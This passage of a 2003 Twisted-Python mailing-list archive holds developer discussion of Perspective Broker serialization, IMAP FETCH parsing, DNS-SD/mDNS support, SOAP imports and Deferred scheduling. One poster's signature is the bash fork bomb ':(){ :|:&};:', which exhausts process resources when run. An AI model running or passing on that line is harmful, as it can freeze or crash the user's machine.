because the comments will contradict the docs, and each other, and you have
to keep mentally backtracking to figure it all out.  

We should be striving for the docs which are correct, and make sense on
first reading, rather than requiring the reader to continually re-read
paragraphs because a comment added "but that only applies when using Foo".  

Perhaps the strongest argument I can make against this is the Zope 2 docs --
user comments have not made them magically useful.  On the contrary, I've
found them to be neglected and incomplete, despite the efforts of the large
Zope community.

You can't fix docs by people scattering little two-liners here and there
saying "actually, that didn't work for me."  

Let people post comments to a real mailing-list.

> Another good addition to the docs would be a listing of significant api 
> changes.  If it's not in there allready somewhere.  eg differences 
> between 1.02 and 1.03, 1.03- 1.04, 1.05-1.06, etc.

That's what the ChangeLog file in the distribution is for, although it's not
readily accessible as a link off the website.  To a lesser extent the
release announcements do this as well; they usually mention the major new
features.  We are generally very good at being backwards-compatible, so
perhaps the best source of details about the changes are any
DeprecationWarnings you get running your code with a new release ;)

-Andrew.




From lafou at wanadoo.fr  Sun Jul  6 03:53:11 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 06 Jul 2003 09:53:11 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <3F074F36.4030403@gmx.net>
References: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
	 <3F074F36.4030403@gmx.net>
Message-ID: <1057477990.8472.1.camel@biproc>

> it was me that originaly posted that code on this list. and have to say 
> that it contains a minor bug. startRunning must be called in the same 
> thread as as twisted.mainloop will (otherwise, some nasty things will 
> happen, like callFromThread() or stop() not working without an external 
> event).

Excuse me Chris, I forgot the copyright  :p
Seriously, this wasn't intentional !






From ecn at metaslash.com  Sun Jul  6 09:28:01 2003
From: ecn at metaslash.com (Eric C. Newton)
Date: Sun, 6 Jul 2003 09:28:01 -0400
Subject: [Twisted-Python] twistd man page
Message-ID: <20030706132801.GA1230@localhost.localdomain>

Twisted 1.0.5

A number of options to twistd are missing from the man page.

	--savestats
	--originalname
	--euid
	--encrypted
	--reactor
	--report-profile

-Eric



From josephwinston at mac.com  Sun Jul  6 09:59:05 2003
From: josephwinston at mac.com (Jody Winston)
Date: Sun, 06 Jul 2003 08:59:05 -0500
Subject: [Twisted-Python] Finding peers.
Message-ID: <16136.11049.63479.337891@frank.xprtcc.com>

I'm also interested in using Rendezvous in twisted.  I don't have much
time at the present to both learn Rendezvous and the internals of
twisted but I'll pass on two links if you haven't seen them.  The
first link is http://dotlocal.org/ and they are "Software developers
interested in implementing zeroconf, multicast dns and dns service
discovery".  The second link is a Python implementation of Rendezvous,
PyRendezvous, which can be found at..
http://radio.weblogs.com/0105002/stories/2003/01/06/multicastDnsServiceDiscoverForPython.html




From ecn at metaslash.com  Sun Jul  6 12:48:21 2003
From: ecn at metaslash.com (Eric C. Newton)
Date: Sun, 6 Jul 2003 12:48:21 -0400
Subject: [Twisted-Python] bad instructions in twisted emacs
Message-ID: <20030706164821.GA4645@localhost.localdomain>

TwistedEmacs-0.2.0

twisted-dev.el, line 5

	;;   (setq load-path (cons "path/to/TwistedEmacs"))

should be

	;;   (setq load-path (cons "path/to/TwistedEmacs" load-path))

-Eric




From pb_twisted at olga.mine.nu  Sun Jul  6 16:10:33 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sun, 6 Jul 2003 22:10:33 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
Message-ID: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>

Hi list,

I'm using PB to transfer the following structure (with a circular reference)
on the server (cut down, incomplete code from my app) to a client:

class Inventory(pb.Cacheable):
    def __init__(self, ownerActor):
        self.owner = ownerActor

    def getStateToCacheAndObserveFor(self, perspective, observer):
        return {"owner" : self.owner}


class PlayerActor(pb.Cacheable):
    def __init__(self):
	  self.name = "MyName"
        self.inventory = Inventory(self)

    def getStateToCacheAndObserveFor(self, perspective, observer):
        return {"inventory" : self.inventory}


On the client, these classes correspond to RemoteInventory and RemoteActor
respectively.

What ends up on the client is an actor with the following __dict__:

{'inventory': <RemoteInventory.RemoteInventory instance at 0x01CE4DA8>,
'broker': <twisted.spread.pb.Broker instance at 0x01C8D588>, 'luid': 5,
'name': 'MyName'}

As expected. However, the inventory:

{'owner': <twisted.persisted.crefutil._Dereference instance at 0x01C90BE0>,
'broker': <twisted.spread.pb.Broker instance at 0x01C8D588>, 'luid': 6}

My client-side inventory owner attribute refers to a _Dereference object
instead of the actor object. I don't know much about Twisted's Jelly, but it
sounds like something that should be removed automatically at the end of the
de-serialization process.

I notice that I can access my inventory.owner.resolvedObject to get the
actual actor object I want, but I cannot access it directly through the
_Dereference object (e.g. inventory.owner.name) as if though it were a proxy
or something. So why is it there, and can/should I get rid of it?

I am sure there is a logic to this, which I'd be grateful if someone would
like to explain to me or, better yet, point me to some nice bedtime reading
on the subject.


- Patrik





From gp.ciceri at acm.org  Sun Jul  6 16:12:16 2003
From: gp.ciceri at acm.org (gian paolo ciceri)
Date: Sun, 06 Jul 2003 22:12:16 +0200
Subject: [Twisted-Python] FYI: sample of interpreted CGI usage in twisted (1.0.6, for windows)
Message-ID: <3F0882A0.1070208@acm.org>

Hello all,
yesterday I've discussed with Itamar in chat
about this setup. He suggested to me to send the
example to the mailing list, for future reference.
It seems that the interesting thing is that it
works on windows, with an interpreted script as cgi.

I use it for moinmoin under twisted.

You've to use the win32 reactor, of course.

Thanks for your attention, have a nice day.

Regards.
/gp

##############################################################
import os
from twisted.internet import app
from twisted.web import static, server, vhost, twcgi, script, trp


root = static.File(os.getcwd() + "/public_html")

class PythonCGIScript(twcgi.FilteredScript):
     filter = 'c:\\Python22\\python.exe' # Points to the python parser

root.processors = {
             '.pcgi': PythonCGIScript,
             '.epy': script.PythonScript,
             '.rpy': script.ResourceScript,
             '.trp': trp.ResourceUnpickler,
}
root.putChild('vhost', vhost.VHostMonsterResource())
site = server.Site(root)
application = app.Application('web')
application.listenTCP(10999, site)
#####################################################################





From itamar at itamarst.org  Sun Jul  6 16:21:26 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 6 Jul 2003 16:21:26 -0400
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030706162127.15228464.itamar@itamarst.org>

On Sun, 6 Jul 2003 22:10:33 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> I am sure there is a logic to this, which I'd be grateful if someone
> would like to explain to me or, better yet, point me to some nice
> bedtime reading on the subject.

Sounds like a bug, actually :)

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From pb_twisted at olga.mine.nu  Sun Jul  6 18:20:32 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Mon, 7 Jul 2003 00:20:32 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <20030706162127.15228464.itamar@itamarst.org>
Message-ID: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>

> > I am sure there is a logic to this, which I'd be grateful if someone
> > would like to explain to me or, better yet, point me to some nice
> > bedtime reading on the subject.
>
> Sounds like a bug, actually :)

Ouch, that is not what I wanted to hear. I experimented with it a bit
further by mutating the duck pond example, and found that:

	def setCopyableState(self, state):
	    self.__dict__.update(state)

gives the strange behavior:

	{'pond': <twisted.persisted.crefutil._Dereference instance at 0x009A1CE8>,
'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}


While:
	def setCopyableState(self, state):
	    self.__dict__ = state

Gives the expected:

	{'pond': <cache_classes.SlaveDuckPond instance at 0x009AD8E8>, 'broker':
<twisted.spread.pb.Broker instance at 0x009AD450>, 'luid': 2}



Also, we have the peculiar case:

	def setCopyableState(self, state):
	    self.__dict__.update(state)
	    self.foo = state

Which gives:

	{'pond': <twisted.persisted.crefutil._Dereference instance at 0x009B5ED8>,
'foo': {'pond': <cache_classes.SlaveDuckPond instance at 0x009AD808>},
'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}

So the item in 'foo' is dereferenced as expected, while __dict__["pond"] is
not. Go figure!


This feels like the twilight zone. Can somebody please tell me what is going
on? I have attached the code for my experiment.


- Patrik
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_classes.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/e0db713e/attachment.txt 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_receiver.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/e0db713e/attachment-0001.txt 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_sender.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/e0db713e/attachment-0002.txt 

From pb_twisted at olga.mine.nu  Sun Jul  6 18:45:16 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Mon, 7 Jul 2003 00:45:16 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>
Message-ID: <JAEDJDIBADCJHPFLNEDFIEFOCAAA.pb_twisted@olga.mine.nu>

> Also, we have the peculiar case:
>
> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)
> 	    self.foo = state
>
> Which gives:
>
> 	{'pond': <twisted.persisted.crefutil._Dereference instance
> at 0x009B5ED8>,
> 'foo': {'pond': <cache_classes.SlaveDuckPond instance at 0x009AD808>},
> 'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}
>
> So the item in 'foo' is dereferenced as expected, while
> __dict__["pond"] is
> not. Go figure!

Never mind this last one, I didn't think far enough there. While it works,
this is what I should have tried, and it doesn't work:

	def setCopyableState(self, state):
	    self.__dict__.update(state)
	    self.foo = state["pond"]


My guess, and I really should know better than to make guesses after
midnight, is that the dereferencing mechanism only works with the 'state'
dictionary itself. That is, in the post processing, it substitutes the real
object references for the _Dereference values in the 'state' dictionary for
the keys it knows. As long as I keep the original state dictionary as master
data, at least until the deserializing is done, everything will work as
expected.

Thinking a little more (still on the wrong side of midnight), I can't really
see a Pythonic way of how the dereferencing mechanism could be solved the
way I initially wanted, i.e. self.__dict__.update(state). I can only come up
with a solution where the _Dereference would have to work as a proxy, and I
guess that there could be some severe side effects.

Unless someone (on the right side of midnight) can suggest something or
point out the error in my thinking, I think I will have to redesign my data
strategy somewhat.


- Patrik





From 2002 at weholt.org  Sun Jul  6 19:43:57 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Mon, 7 Jul 2003 01:43:57 +0200
Subject: [Twisted-Python] RFC : Test implementation. Need comments
Message-ID: <005301c34418$7855f930$0401a8c0@razor>

Hi,

To get the hang of Twisted I've tried to port an old BaseHTTPServer-based
project, or at least parts of it. It loads dynamic pages, ie. Twisted
Resources, dynamically. It's *very* crude and ugly code, but I just would
like to get some comments to see if I'm on a totally wrong track here.

It's been a couple of days since I wrote the code and I've had time to
implement another, more complete version, with XML-RPC support, modules with
RPC-methods loaded dynamically also. Will include SOAP support very soon. It
also "solves" the problem of what to put where when deplyoing Twisted-web
applications; I've created a folder structure looking like this :

1. wwwroot/pages -> modules for dynamic pages, ie. subclassing Resource
2. wwwroot/static -> images and other static content
3. application/data -> all data, like database files etc. are stored here
4. application/config -> all config files are stored here. Using INI-files
for now, dynamically loaded into the service object
5. application/rpc -> modules with rpc-methods, available in both XML-RPC
and SOAP at the same time. Loaded dynamically
6. application/businessobjects -> objects solving logic and storing/loading
data, loaded dynamically, available to and used by rpc-classes and dynamic
pages.

( the version online does not use this structure, but something simpler )

My latest version uses mainly the same method to load all the other
dynamically loaded stuff, so the version online will give you an idea of
what I'm doing. If my first attempt available now is not totally off, I'll
make the next version available sometime tomorrow. If not I'll take the
comments on this one and re-write the current implementations based on ideas
or comments from the list.

The files are available at :
http://home.online.no/~t-weh/articles/projects/elope/elopetestimplementation
.zip
Extract them into your python-path and start the file in the
testsite-folder.

For now what I'm mainly looking for is a cleaner, more Twisted way of
loading the page-Resources and how to use the Twisted-Service-class
properly. For now it holds all configuration data in the entire application,
rpc-methods, businessobjects available for the entire application and later
it will hold some scheduled method-calls to dynamically loaded objects doing
specific tasks. I do not know if this is the proper way to do this.

Best regards,
Thomas




From ta-meyer at ihug.co.nz  Sun Jul  6 23:57:45 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Mon, 7 Jul 2003 15:57:45 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1302393E80@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>

Regarding the new parameter parsing for the IMAP server:

At the moment, FETCH args are parsed with ParseNestedList, which means that
any items inside [] are appended as an additional list.

For example, this command:
    0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
Becomes:
    ['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']], UID]

There are really two items that have been requested - BODY.PEEK and UID, but
the args list has three, because the BODY.PEEK information has been split
into a separate item.

It seems to me that it would make more sense for the result to be:
    [['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']]], UID]
Or something like that, which keeps the body.peek information together.
(Note that BODY and BODY.PEEK are the only two FETCH args that have a []
part.)

This is both closer to what was requested, and much easier to parse (IMO).

Thoughts?  (I'm happy to write a patch, but there doesn't seem much point if
people don't agree).

=Tony Meyer




From exarkun at twistedmatrix.com  Mon Jul  7 03:24:35 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Mon, 7 Jul 2003 03:24:35 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F1302393E80@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>
Message-ID: <20030707072435.GA32716@intarweb.us>

On Mon, Jul 07, 2003 at 03:57:45PM +1200, Tony Meyer wrote:
> Regarding the new parameter parsing for the IMAP server:
> 
> At the moment, FETCH args are parsed with ParseNestedList, which means that
> any items inside [] are appended as an additional list.
> 
> For example, this command:
>     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
> Becomes:
>     ['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']], UID]
> 
> There are really two items that have been requested - BODY.PEEK and UID, but
> the args list has three, because the BODY.PEEK information has been split
> into a separate item.

  Ideally, I'd like to see this parsed into a structure resembling this:

    [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]

  The mailbox implementation should have as little knowledge of IMAP4 as
humanly possible.  The current implementation is an example of the "just
enough to work" philosophy.  parseNestedList was actually hacked pretty
awfully to support this after I initially wrote it, because I'd forgotten
about this particular aspect of the IMAP4 query syntax.

> 
> It seems to me that it would make more sense for the result to be:
>     [['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']]], UID]
> Or something like that, which keeps the body.peek information together.
> (Note that BODY and BODY.PEEK are the only two FETCH args that have a []
> part.)
> 

  It does seem like a slight improvement, but I'm not sure it is significant
enough to merit a stop in the API roadmap.  On the other hand, if you're
willing to implement it... ;)


> This is both closer to what was requested, and much easier to parse (IMO).

  Parsing the current form isn't so bad.  Here's a snippet from the mailbox
I've written:

        i = 0
        r = {}
        L = len(parts)
        while i < L:
            p = parts[i]
            fn = p.upper().replace('.', '_')
            f = getattr(self, '_fetch_' + fn, None)
            if not f:
                raise NotImplementedError, fn
            if i + 1 < L:
                if isinstance(parts[i + 1], types.ListType):
                    r.update(f(msg, parts[i + 1]))
                    i += 2
                    continue
            r.update(f(msg))
            i += 1
        return r

  The key section of interest here is the isinstance() check (the loop
dispatches actual fetching to methods named like "_fetch_BODY_PEEK" and so
on).  I believe parsing an alternate form that continued to intersperse
lists with strings would be pretty similar, with just a few checks
re-arranged.

  Would you be interested in patching the fetch methods to generate a
structure like the one I described above?  Or if you have another idea for a
parsed query structure that is similarly abstracted away from the protocol,
I'd be glad to entertain it.

  Lastly, I definitely recognize this as a weak point in the IMAP4 code, but
fixing it has not yet become a priority, as I already have a working parser.

  Jp

-- 
A disciple of another sect once came to Drescher as he was eating his
morning meal. "I would like to give you this personality test," said the
outsider, "because I want you to be happy." Drescher took the paper that was
offered him and put it into the toaster: "I wish the toaster to be happy, 
too."



From ta-meyer at ihug.co.nz  Mon Jul  7 03:36:58 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Mon, 7 Jul 2003 19:36:58 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF02@its-xchg4.massey.ac.nz>

> Ideally, I'd like to see this parsed into a structure resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]

That looks fine to me.

> Parsing the current form isn't so bad.  Here's a snippet 
> from the mailbox I've written:
[...]

Thanks for that.  It's nicer than what I've got at the moment, although
similar in form.

>   Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

Yes.  I'll try and get to this shortly.  Although I've done a stopgap
solution, I would rather create a patch and have a nicer solution :)

>   Lastly, I definitely recognize this as a weak point in the 
> IMAP4 code, but fixing it has not yet become a priority, as I 
> already have a working parser.

:)  You're ahead of me there, although I'm slowly getting closer.

=Tony Meyer




From screwtape at froup.com  Mon Jul  7 09:38:38 2003
From: screwtape at froup.com (Tim Allen)
Date: Mon, 7 Jul 2003 23:38:38 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <16136.11049.63479.337891@frank.xprtcc.com>
Message-ID: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>

On Sunday, Jul 6, 2003, at 23:59 Australia/Sydney, Jody Winston wrote:
> I'm also interested in using Rendezvous in twisted.  I don't have much
> time at the present to both learn Rendezvous and the internals of
> twisted but I'll pass on two links if you haven't seen them.  The
> first link is http://dotlocal.org/ and they are "Software developers
> interested in implementing zeroconf, multicast dns and dns service
> discovery".  The second link is a Python implementation of Rendezvous,
> PyRendezvous, which can be found at..
> http://radio.weblogs.com/0105002/stories/2003/01/06/ 
> multicastDnsServiceDiscoverForPython.html

I just spend a day or so reading about ZeroConf and Twisted's DNS  
support, and hacking together the attached code.

The quick, quick summary is this: ZeroConf has two important parts:  
DNS-SD and mDNS.

DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
standard way of organising DNS records such that a set of DNS queries  
can create a useful list of things to connect to. 'Implementing' DNS-SD  
support is not at all difficult, providing there exists an API to  
request PTR and SRV records, and providing you can add them to your DNS  
server.

mDNS (Multicast DNS) is more complex, and seems to require  
operating-system cooperation. Regular DNS queries to the magic address  
224.0.0.251 on port 5353 UDP are declared to be multicast queries, and  
link-local. Also, any attempt to resolve any address ending in '.local'  
should be done via multicast. With multicast DNS come some different (I  
think - I don't know DNS all that well) behaviours:
	- When you send a request that you've already got a reply for, you  
should include the
	  list of names you already have, so those services know not to  
respond a second time.
	- Single requests can have multiple replies.
	- You can have a 'continuous request'.

I haven't read the mDNS spec in detail, but the interaction between  
Twisted and the operating system's resolver seems complex. It'd be nice  
if Python had a DNS API more extensive than gethostbyname(), but it  
doesn't.

The attached files are a first draft at a DNS-SD client library for  
Twisted. dns_sd.py contains the meat, and dns_st_client.py is a thin  
wrapper based on doc/examples/dns-service.py dns_sd.py also contains a  
quick hack to make Twisted.Names issue mDNS requests. The end result is  
that on my Powerbook G4 running Mac OS X 10.2.6, I get the following  
output:

$ ./dns_sd_client.py http tcp local
{'instance': u"Tim Allen's Web Site",
  'servers': [('grundoon.local', 80)],
  'serviceInstance': "Tim Allen's Web Site._http._tcp.local",
  'settings': {'path': '/~st/'}}
{'instance': u'Grundoon',
  'servers': [('grundoon.local', 80)],
  'serviceInstance': 'Grundoon._http._tcp.local',
  'settings': {}}

Note that my laptop's name is 'grundoon' and my login name is 'st'.

The only obvious wart in the code as it stands is that the spec says  
that the 'instance' name can contain any Unicode character, while  
Twisted's DNS code seems to choke on DNS name components that contain  
periods. For the record, the DNS-SD spec says that embedded periods  
should be written '\.', and backslashes obviously '\\'.

It occurs to me now that perhaps I should have written a patch for the  
Twisted DNS code and submitted it along with this message, but it's  
getting late and I wish to get some sleep before I go to work tomorrow.  
:)

-------------- next part --------------
A non-text attachment was scrubbed...
Name: dns_sd.py
Type: application/octet-stream
Size: 6757 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/26bfc172/attachment.obj 
-------------- next part --------------
A non-text attachment was scrubbed...
Name: dns_sd_client.py
Type: application/octet-stream
Size: 598 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/26bfc172/attachment-0001.obj 

From mmoellenbeck at plus.de  Mon Jul  7 09:57:28 2003
From: mmoellenbeck at plus.de (mmoellenbeck at plus.de)
Date: Mon, 7 Jul 2003 15:57:28 +0200
Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor
Message-ID: <OF3DF17A7B.F75AB5E6-ONC1256D5C.004C3C60@uz.tengelmann.de>

hi,

has anybody an example for using select/option with 
t.w.w.form.FormProcessor?

thanks and regarts

Martin Moellenbeck 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030707/770d859b/attachment.htm 

From justinjohnson at fastmail.fm  Mon Jul  7 15:13:33 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 07 Jul 2003 13:13:33 -0600
Subject: [Twisted-Python] the new cred and xmlrpc
Message-ID: <20030707191333.7021F32D0B@www.fastmail.fm>

Hi,

Would someone mind helping me out with the new cred?  I'm looking at
webhappyrealm.py and trying to get a feel for how this works, but I'm not
sure how to use it for my twisted.web.xmlrpc.XMLRPC service.

Thanks.
-Justin



From 2002 at weholt.org  Mon Jul  7 17:00:21 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Mon, 7 Jul 2003 23:00:21 +0200
Subject: [Twisted-Python] Patch for twisted.web.soap
Message-ID: <003a01c344ca$c7874740$0401a8c0@razor>

To get twisted.web.soap working with SOAPpy 0.10.1 you have to change the
line

import SOAP

to

from SOAPpy import SOAP

in twisted.web.soap.

Perhaps get that into the CVS-version? I think my fix is also just a quick
hack, but the CVS-version should be updated to support the new import
syntax.

Best regards,
Thomas Weholt




From 2002 at weholt.org  Mon Jul  7 18:30:43 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Tue, 8 Jul 2003 00:30:43 +0200
Subject: [Twisted-Python] Problems with deferred
Message-ID: <005201c344d7$68346ef0$0401a8c0@razor>

Hi,

I got a tip earlier from this list on how to implement a scheduled task, or
in my case several task. I want my ApplicationService-object to hold a list
of tasks, looking somewhat like the ones subclassing the task-class in the
code below, where a method called Action is called on a given interval. I
want users to be able to just subclass my task-class and override the
action-method and then the application will create a list of instances of
these tasks, call their start method and from there on their action method
will be called over and over on the intervall specified in their
refreshInterval-attribute given at creation.

Does that makes sense? In my code only Task1.action is called, and
Task2.action is called just before the thing exits. Why?

Any hints?

from twisted.internet.app import Application, ApplicationService
from twisted.internet import defer
from twisted.internet import reactor
from twisted.python import log

class task:

    def __init__(self, service, refreshInterval=5):
        self.service = service
        self.refreshInterval = refreshInterval

    def start(self):
        reactor.callLater(self.refreshInterval, self.execute)

    def action(self):
        "Override this!"
        print "action called"

    def execute(self):
        d = defer.Deferred()
        reactor.callLater(0, self.action)

        # Log any errors in downloading or processing
        d.addErrback(log.err)

        # Reschedule this function
        d.addBoth(reactor.callLater, self.refreshInterval, self.execute)

class task1(task):
    def action(self):
        print "Task 1 called"

class task2(task):
    def action(self):
        print "Task 2 called"

class testservice(ApplicationService):

    def __init__(self, application):
        self.application = application
        self.tasks = [task1(self), task2(self)]

    def startService(self):
        print "Starting services"
        for task in self.tasks:
            task.start()


    def stopService(self):
        print "Stopping services"

app = Application('test app')
srv = testservice(app)
app.run()


Best regards,
Thomas W




From andrew-twisted at puzzling.org  Mon Jul  7 21:46:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 11:46:39 +1000
Subject: [Twisted-Python] Patch for twisted.web.soap
In-Reply-To: <003a01c344ca$c7874740$0401a8c0@razor>
References: <003a01c344ca$c7874740$0401a8c0@razor>
Message-ID: <20030708014639.GA16393@frobozz>

On Mon, Jul 07, 2003 at 11:00:21PM +0200, Thomas Weholt wrote:
> To get twisted.web.soap working with SOAPpy 0.10.1 you have to change the
> line
[...]
> 
> Perhaps get that into the CVS-version? I think my fix is also just a quick
> hack, but the CVS-version should be updated to support the new import
> syntax.

Itamar is a couple of days ahead of you:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/web/soap.py?rev=1.3&content-type=text/vnd.viewcvs-markup&cvsroot=Twisted

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul  7 21:54:22 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 11:54:22 +1000
Subject: [Twisted-Python] Problems with deferred
In-Reply-To: <005201c344d7$68346ef0$0401a8c0@razor>
References: <005201c344d7$68346ef0$0401a8c0@razor>
Message-ID: <20030708015422.GB16393@frobozz>

On Tue, Jul 08, 2003 at 12:30:43AM +0200, Thomas Weholt wrote:
> 
>     def execute(self):
>         d = defer.Deferred()
>         reactor.callLater(0, self.action)
> 
>         # Log any errors in downloading or processing
>         d.addErrback(log.err)
> 
>         # Reschedule this function
>         d.addBoth(reactor.callLater, self.refreshInterval, self.execute)

This function is obviously wrong.  It creates a Deferred, but there is no
reference to it outside of this function.  So there is nowhere else in your
code that could get an opportunity to call d.callback or d.errback, and this
function never calls that, thus this Deferred will never fire.  So this
function is equivalent to:

    def execute(self):
        reactor.callLater(0, action)

I'm guessing this isn't what you meant :)

I think you've possibly confused reactor.callLater with
twisted.internet.threads.deferToThread?

-Andrew.




From tv at twistedmatrix.com  Tue Jul  8 03:49:40 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Tue, 8 Jul 2003 10:49:40 +0300
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
Message-ID: <20030708074940.GA6207@lapdog>

On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> standard way of organising DNS records such that a set of DNS queries  
> can create a useful list of things to connect to. 'Implementing' DNS-SD  
> support is not at all difficult, providing there exists an API to  
> request PTR and SRV records, and providing you can add them to your DNS  
> server.

	That exists, start reading from
	twisted.internet.utils.SRVConnector.

> I haven't read the mDNS spec in detail, but the interaction between  
> Twisted and the operating system's resolver seems complex. It'd be nice  
> if Python had a DNS API more extensive than gethostbyname(), but it  
> doesn't.

	That's why Twisted (and many other serious projects) are totally
	ignoring the libc resolver. The API is just too limited.

	Let me say that again. Twisted implements its own resolver that
	talks UDP itself. gethostbyname() is just not usable.

-- 
:(){ :|:&};:



From screwtape at froup.com  Tue Jul  8 06:38:18 2003
From: screwtape at froup.com (screwtape at froup.com)
Date: Tue, 8 Jul 2003 20:38:18 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708074940.GA6207@lapdog>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog>
Message-ID: <20030708103817.GA17209@ferd2.thristian.org>

On Tue, Jul 08, 2003 at 10:49:40AM +0300, Tommi Virtanen wrote:
> On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> > DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> > standard way of organising DNS records such that a set of DNS queries  
> > can create a useful list of things to connect to. 'Implementing' DNS-SD  
> > support is not at all difficult, providing there exists an API to  
> > request PTR and SRV records, and providing you can add them to your DNS  
> > server.
> 
> 	That exists, start reading from
> 	twisted.internet.utils.SRVConnector.

I see. Thanks!

> > I haven't read the mDNS spec in detail, but the interaction between  
> > Twisted and the operating system's resolver seems complex. It'd be nice  
> > if Python had a DNS API more extensive than gethostbyname(), but it  
> > doesn't.
> 
> 	That's why Twisted (and many other serious projects) are totally
> 	ignoring the libc resolver. The API is just too limited.
> 
> 	Let me say that again. Twisted implements its own resolver that
> 	talks UDP itself. gethostbyname() is just not usable.

Hm.. ISTR someone saying a while ago that Twisted should use the
operating system's resolver, since it might have a far more complex
configuration than Twisted can read from /etc/resolv.conf - indeed,
here on OS X, /etc/resolv.conf is a just a file written to keep legacy
Unix apps happy - the real resolver seems to have something to do with
this strange /etc/resolver directory I've just discovered.

Anyway, I just looked up ReactorBase._internalResolve() in
twisted.internet.base, and this is what it says:

    def _internalResolve(self, name, timeout):
        try:
            address = socket.gethostbyname(name)
        except socket.error:
            return defer.fail(failure.Failure(error.DNSLookupError("address not found")))
        else:
            return defer.succeed(address)

Granted, ReactorBase.resolve() doesn't call _internalResolve if a new resolver
has been installed (ReactorBase.installResolver()), but a quick grep
of the Twisted source shows no mention of that method apart from its
